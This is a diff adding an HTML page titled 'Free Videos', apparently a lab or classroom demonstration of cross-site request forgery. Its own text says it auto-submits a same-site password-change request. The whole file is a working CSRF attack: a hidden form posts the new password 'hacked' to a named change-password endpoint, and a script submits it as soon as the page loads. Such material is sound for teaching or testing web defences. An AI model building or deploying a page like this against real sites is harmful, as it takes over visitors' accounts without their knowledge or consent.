@@ -1,0 +1,13 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Free Videos</title></head>
+<body>
+  <h1>Free Videos</h1>
+  <p>When loaded, this page automatically submits a cross-origin, same-site password-change request.</p>
+  <form action="https://networking-experiments.nju-slab.cn/change-password"
+        method="post" id="csrf-form">
+    <input type="hidden" name="new_password" value="hacked">
+  </form>
+  <script>document.getElementById("csrf-form").submit();</script>
+</body>
+</html>
